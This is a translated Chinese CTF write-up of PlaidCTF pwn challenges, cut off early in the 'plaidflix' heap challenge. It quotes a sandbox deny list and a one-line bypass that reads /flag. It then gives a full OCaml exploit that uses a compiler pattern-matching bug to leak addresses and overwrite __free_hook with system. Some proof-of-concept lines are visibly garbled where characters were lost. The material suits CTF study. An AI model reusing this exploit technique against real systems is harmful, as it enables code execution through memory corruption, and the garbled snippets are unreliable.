# PlaidCTF部分pwn分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
分享一下上周PlaidCTF的几个pwn题。
## Secure OCaml Sandbox
###  题目分析
题目给了一个Ocaml语言的编译执行环境，输入即是一段Ocaml语言写的代码，目标会对其进行编译执行。
但是首先，执行之前会做一些简单的检查以及添加一个沙箱：
    #!/bin/sh
    set -eu
    if grep -qe "external" -e "unsafe" /input/exploit.ml; then
        echo "unsafe!"
        exit 1
    fi
    echo "open! Sos" > user/exploit.ml
    cat /input/exploit.ml >> user/exploit.ml
    dune exec user/exploit.exe
  * 首先代码不能包含`external`和`unsafe`，也就是避免了直接通过`external`导入C函数；
  * 其次不能包括`unsafe`，从官方文档里得知，诸如`unsafe-string`之类的没有安全边界检查，也就是可以溢出，现在被禁用了；
  * 最后，在每个输入前添加”open! Sos\n”，也就是导入Sos模块。
至于这个Sos模块：
    open struct
      let blocked = `Blocked
      module Blocked = struct
        let blocked = blocked
      end
    end
    module Fixed_stdlib = struct
      let open_in = blocked
      let open_in_bin = blocked
      let open_in_gen = blocked
      let open_out = blocked
      let open_out_bin = blocked
      let open_out_gen = blocked
      let unsafe_really_input = blocked
      module Fixed_arg = struct
        include Arg
        let read_arg = blocked
        let read_arg0 = blocked
        let write_arg = blocked
        let write_arg0 = blocked
      end
      module Fixed_array = struct
        include Array
        let unsafe_set = blocked
        let unsafe_get = blocked
        module Floatarray = struct
          let unsafe_set = blocked
          let unsafe_get = blocked
        end
      end
      module Fixed_arrayLabels = struct
        include ArrayLabels
        let unsafe_set = blocked
        let unsafe_get = blocked
        module Floatarray = struct
          let unsafe_set = blocked
          let unsafe_get = blocked
        end
      end
      module Fixed_bytes = struct
        include Bytes
        let unsafe_blit = blocked
        let unsafe_blit_string = blocked
        let unsafe_fill = blocked
        let unsafe_get = blocked
        let unsafe_set = blocked
        let unsafe_of_string = blocked
        let unsafe_to_string = blocked
      end
      module Fixed_bytesLabels = struct
        include Bytes
        let unsafe_blit = blocked
        let unsafe_blit_string = blocked
        let unsafe_fill = blocked
        let unsafe_get = blocked
        let unsafe_set = blocked
        let unsafe_of_string = blocked
        let unsafe_to_string = blocked
      end
      module Fixed_char = struct
        include Char
        let unsafe_chr = blocked
      end
      module Fixed_filename = struct
        include Filename
        let open_temp_file = blocked
        let temp_file = blocked
      end
      module Fixed_float = struct
        include Float
        module Array = struct
          include Array
          let unsafe_set = blocked
          let unsafe_get = blocked
        end
        module ArrayLabels = struct
          include ArrayLabels
          let unsafe_set = blocked
          let unsafe_get = blocked
        end
      end
      module Fixed_scanf = struct
        include Scanf
        module Scanning = struct
          include Scanning
          let open_in = blocked
          let open_in_bin = blocked
          let close_in = blocked
          let from_file = blocked
          let from_file_bin = blocked
        end
      end
      module Fixed_string = struct
        include String
        let unsafe_blit = blocked
        let unsafe_fill = blocked
        let unsafe_get = blocked
        let unsafe_set = blocked
      end
      module Fixed_stringLabels = struct
        include StringLabels
        let unsafe_blit = blocked
        let unsafe_fill = blocked
        let unsafe_get = blocked
        let unsafe_set = blocked
      end
      module Fixed_stdLabels = struct
        module Array = Fixed_arrayLabels
        module Bytes = Fixed_bytesLabels
        module List = ListLabels
        module String = Fixed_stringLabels
      end
      module Fixed_uchar = struct
        include Uchar
        let unsafe_of_int = blocked
        let unsafe_to_char = blocked
      end
      module Arg = Fixed_arg
      module Array = Fixed_array
      module ArrayLabels = Fixed_arrayLabels
      module Bigarray = Blocked
      module Bytes = Fixed_bytes
      module BytesLabels = Fixed_bytesLabels
      module Char = Fixed_char
      module Filename = Fixed_filename
      module Float = Fixed_float
      module Marshal = Blocked
      module Obj = Blocked
      module Pervasives = Blocked
      module Printexc = Blocked
      module Scanf = Fixed_scanf
      module Spacetime = Blocked
      module StdLabels = Fixed_stdLabels
      module String = Fixed_string
      module StringLabels = Fixed_stringLabels
      module Sys = Blocked
      module Uchar = Fixed_uchar
    end
    include Fixed_stdlib
    module CamlinternalLazy = Blocked
    module CamlinternalMod = Blocked
    module CamlinternalOO = Blocked
    module Dynlink = Blocked
    module Profiling = Blocked
    module Raw_spacetime_lib = Blocked
    module Stdlib = Fixed_stdlib
    module Topdirs = Blocked
    module Unix = Blocked
    module UnixLabels = Blocked
    module Stdlib__arg = Fixed_arg
    module Stdlib__array = Fixed_array
    module Stdlib__arrayLabels = Fixed_arrayLabels
    module Stdlib__bigarray = Blocked
    module Stdlib__bytes = Fixed_bytes
    module Stdlib__bytesLabels = Fixed_bytesLabels
    module Stdlib__char = Fixed_char
    module Stdlib__filename = Fixed_filename
    module Stdlib__float = Fixed_float
    module Stdlib__marshal = Blocked
    module Stdlib__obj = Blocked
    module Stdlib__pervasives = Blocked
    module Stdlib__printexc = Blocked
    module Stdlib__scanf = Fixed_scanf
    module Stdlib__spacetime = Blocked
    module Stdlib__stdLabels = Fixed_stdLabels
    module Stdlib__string = Fixed_string
    module Stdlib__stringLabels = Fixed_stringLabels
    module Stdlib__sys = Blocked
    module Stdlib__uchar = Fixed_uchar
则是阻断了可以执行shell命令的接口。
###  解题过程
  1. 由于这个题目有两个，第一个是如上加了`open! Sos\n`，这里的预期解法是： 
         open! Sos (* add by main **)
     .Fixed_arg;;
     let ic = open_in "/flag";;
     let flag = input_line ic;;
     print_string flag;;
也就是实际上并没有完全加载Sos，而是只加载了`Sos.Fixed_arg`，因此沙箱失效，仍然可以orw。
  2. 而主要是第二个，其实来自于SECCON 2020 Quals上的mlml，只是在那基础上添加了更为严格的沙箱，把当时比赛上的非预期都屏蔽了。  
但是这篇[博客](https://moraprogramming.hateblo.jp/entry/2020/10/14/185946)中，还是提到了预期解在于Ocaml本身的一个[漏洞](https://github.com/ocaml/ocaml/issues/7241)。  
同时，还给出了exp，所以比赛的时候就照着改一些偏移就能打通了，接下来具体分析一下是怎么利用的。
###  漏洞分析
首先从这个简单的POC入手：
    type u = {a: bool; mutable b: int option}
    let f x =
      match x with
        { a = false; _ } -> 0
      | { b = None; _ } -> 1
      | _ when (x.b  2
      | { a = true; b = Some y } -> y
    let _ = f { a = true; b = Some 5}
这段代码执行会直接`Segmentation fault (core dumped)`，原因在于调用`f { a = true; b = Some
5}`的时候，关注到第三个匹配`_ when (x.b  2`，由于这里执行了赋值操作`x.b  0
      | (_,{contents=D _}) -> 1
      | _ when (x2 := D(s); false) -> 2
      | (true, {contents=C y}) -> y
`leak`函数中`x2 :=
D(s)`实现了以`s`为参数调用`D`的构造函数，并将其赋值给`x2`，最后返回的`y`就是这个`x2`，从而将`s`的地址给泄露出来。  
以及：
    type s2 = G of int | H of (int -> string)
    let s = "AAAAAAAAAAAAAAAAAAAAA"
    let bye (x1, x2) y =
       match (x1, x2) with
        (false, _) -> "ab"
      | (_, {contents=G _}) -> "b"
      | _ when (x2 := G y; false) -> "c"
      | (true, {contents=H y}) -> y 0
`bye`中通过`x2 := G
y`将`x2`改为传入的参数`y`，最后将`y`中存放的地址作为类似于函数指针进行执行，由于`y`是传入的参数，所以相当于实现了任意地址跳转的功能。
所以通过以上方法，先泄露出程序基址，再从got表中泄露出libc地址，再任意地址写入onegadget，通过`bye`执行即可。  
至于为何leak出来的地址要做一些`*2`甚至`+1`的操作，原因尚不明确，但是用IDA分析一下编译出来的`exploit.exe`，可以发现这些地址确实都进行了奇怪的处理，比如写在ocaml程序里的常数，编译出来的结果是`*2`之后的。  
不过影响不大，做一下对称的处理就行。
###  exp
    open Bytes
    open Printf
    type t = A of int | B of (bytes)                                
    type s = C of int | D of (string )
    type t2 = E of int | F of (int ref)
    type s2 = G of int | H of (int -> string)
    let s = "AAAAAAAAAAAAAAAAAAAAAAAA"
    let bye (x1, x2) y =
       match (x1, x2) with
        (false, _) -> "a"
      | (_, {contents=G _}) -> "b"
      | _ when (x2 := G y; false) -> "c"
      | (true, {contents=H y}) -> y 1
    let rec byebye n x y =
        if n = 0 then bye x y ^ "c" else byebye (n-1) x y ^ "d"
    let leak3 (x1,x2) y =
      match (x1,x2) with
        (false, _) -> of_string "a"
      | (_,{contents=A _}) -> of_string "b"
      | _ when (x2 := A y; false) -> of_string "c"
      | (true, {contents=B y}) -> y
    let leak (x1,x2) s =
      match (x1,x2) with
        (false,_) -> 0
      | (_,{contents=D _}) -> 1
      | _ when (x2 := D(s); false) -> 2
      | (true, {contents=C y}) -> y
    let leak2 (x1,x2) y =
      match (x1,x2) with
        (false, _) -> ref 0
      | (_,{contents=E _}) -> ref 1
      | _ when (x2 := E(y); false) -> ref 2
      | (true, {contents=F y}) -> y
    let prog_base = leak (true, ref (C 1)) s * 2 - 0xDBE78 + 1 (* 0xDBE78 is the offset of string s *)
    let target = (0xD9FE0 + prog_base) / 2
    let r = leak2 (true, ref (F (ref 1))) target
    let libc_base = ((!r) land 0xffffffffff) * 2 * 256 - 0x23e00
    let free_hook = libc_base + 0x1bd8e8
    let system = libc_base + 0x448a3
    let _ = printf "0x%x\n" (prog_base)
    let _ = printf "0x%x\n" (target)
    let _ = printf "0x%x\n" (libc_base)
    let r = leak3 (true,ref (B (of_string "c"))) (free_hook / 2)
    let () = set r 0 (char_of_int ((system lsr 0) mod 256))
    let () = set r 1(char_of_int ((system lsr 8) mod 256))
    let () = set r 2(char_of_int ((system lsr 16) mod 256))
    let () = set r 3(char_of_int ((system lsr 24) mod 256))
    let () = set r 4(char_of_int ((system lsr 32) mod 256))
    let () = set r 5(char_of_int ((system lsr 40) mod 256))
    let () = set r 6(char_of_int ((system lsr 48) mod 256))
    let s = byebye 1 (true, ref(H(string_of_int))) (free_hook/ 2)
## plaidflix
算是比赛中最简单的一道题吧，非常常规的菜单题，只不过glibc是2.32的，但是对做题影响不大。
###  题目分析
首先`add_friend`：
    void add_friend()
    {
        friend *v0; // rbx
        int i; // [rsp+4h] [rbp-1Ch]
        __int64 size; // [rsp+8h] [rbp-18h]
        for ( i = 0; i  0x90 )
                {
                    puts("No one has such a long name. Try again.");
                    return;
                }
                if ( size name = (name)malloc(size);
                puts("What's your friend's name?");